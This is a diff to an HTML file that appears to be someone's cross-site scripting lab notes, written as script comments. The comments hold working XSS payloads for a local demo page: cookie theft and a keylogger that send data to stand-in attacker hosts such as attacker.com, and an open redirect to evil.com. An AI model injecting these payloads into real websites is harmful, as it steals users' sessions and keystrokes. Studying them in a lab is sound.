@@ -28,9 +28,27 @@
         //another way = fetch("https://attacker_url.com?victim_cookie="+document.cookie)
     //For this lab you can use :127.0.0.1:5500/demo1.html?test=<img src=x onerror=eval(document.location="https://burpcollaboratorlink.com?token"%2Bdocument.cookie)>
 
+    
+    //XSS to open redirection from xss
+    // document.location = "http://evil.com"
+   //  For this lab payload=127.0.0.1:5500/demo1.html?test=<img src=x onerror=eval(document.location="http://evil.com")>
 
 
+    //XSS to keylogger attack or keystroking attack 
+    //Payload : onkeypress --> document.onkeypress=function(e){console.log(e)} //first see this in browser whether it is working or not
+    //<img src=x onerror=document.onkeypress=function(e){console.log(e)}>
+     
+    //REAL PAYLOAD TO SEND FOR POC :
+    //sending to attacker:  fetch("https://attacker.com?keystoke="+document.onkeypress.key)
 
+    //document.onkeypress = function(e) {fetch("https://attacker.com?keystroke=" + e.key);};
+    //Always url encode the + sign by %2B
+
+
+    //XSS to content manipulation or website defacing
+    // Find id first then you can do content manipulation
+    // like : get the object then modify it
+    
 
     </script>
 </body>
